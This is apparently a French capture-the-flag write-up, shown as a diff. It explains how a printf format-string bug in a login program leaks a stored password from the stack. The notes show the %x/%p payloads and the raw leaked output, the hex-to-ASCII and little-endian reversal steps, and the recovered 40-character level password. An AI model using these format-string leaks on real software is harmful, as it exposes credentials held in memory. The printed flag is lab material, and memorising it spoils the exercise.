@@ -1,8 +1,62 @@
 C'est encore un programme qui attend un username et un mdp.
 
-Si on entre un tres grand username on remarque que l'entrée attendue pour le mdp 
-n'est pas demandé et les "*" du puts du dessous s'affichent : on a écrit dans le buf
-du mdp depuis la premiere entrée ?
+On peut voir deux choses intéressantes : 
+- le mdp du level3 est lu et enregistré dans un buffer
+- un system("/bin/sh") est présent dans une condition
 
-system("/bin/sh") qui peut se lancer en resolvant une condition. Comment résoudre la
-condition ?
+On a tout d'abord chercher comment le shell pouvait être executé mais impossible de 
+trouver une solution. Fausse piste ?
+
+On s'est finalement rendu compte qu'il y avait plusieurs printf qui étaient 
+exploitables et on s'est souvenu que le mdp lu au début du programme était stocké
+dans un buffer sur la stack ! Il est donc possible de le lire avec les printf via
+%x ou %p.
+
+On a donc lancé le programme avec de nombreux %x en username :
+%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
+
+-> ffffe3d0 0 62 2a2a2a2a 2a2a2a2a ffffe5c8 f7ff9a08 62626262 0 0 0 0 0 0 0 0 0 0 0 
+0 0 34376848 61733951 574e6758 6e475873 664b394d 0 25207825 20782520 78252078  does 
+not have access!
+
+On peut voir des choses intéressantes mais assez illisibles.
+
+Avec des %p :
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
+-> 0x7fffffffe3d0 (nil) 0x62 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 
+0x7fffffffe5c8 0x1f7ff9a08 0x41414141 (nil) (nil) (nil) (nil) (nil) (nil) (nil) 
+(nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 
+0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 
+0x2520702520702520 0x2070252070252070  does not have access!
+
+Grâce à un convertisseur hexa -> ascii on peut traduire certains morceaux du retour.
+(https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)
+
+0x2a2a2a2a2a2a2a2a = ******** -> Correspond aux étoiles affichées dans un des puts.
+0x41414141 = AAAA -> Correspond au mdp qu'on a rentré
+0x100000000 = ???? -> N'est pas traduisible en ascii
+0x756e505234376848 = unPR47hH -> du texte qui est bien traduisible en ascii !
+
+On se souvient que le mdp est composé de lettre (min et maj) et de chiffre. Il est 
+possible qu'on en ai trouvé un morceau ! Nous avons besoin de 40 charactères, 
+regardons l'hexa qui suit :
+0x45414a3561733951 = EAJ5as9Q -> encore de l'ascii !
+0x377a7143574e6758 = 7zqCWNgX
+0x354a35686e475873 = 5J5hnGXs
+0x48336750664b394d = H3gPfK9M
+
+Avec le nul juste après on obtient bien une string de 40 charactères (8*5=40). 
+
+Si on recompose le mdp on obtient : unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+L'authentification echoue malheureusement...
+
+La raison pour laquelle cela n'a pas marché est que l'on est sur un systeme en 
+little endian, donc les bytes sont stockés "a l'envers". Il faut donc qu'on reverse
+chaque chaine de charactères..
+unPR47hH -> Hh74RPnu
+EAJ5as9Q -> Q9sa5JAE
+7zqCWNgX -> XgNWCqz7
+5J5hnGXs -> sXGnh5J5
+H3gPfK9M -> M9KfPg3H
+
+Le mdp est donc : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
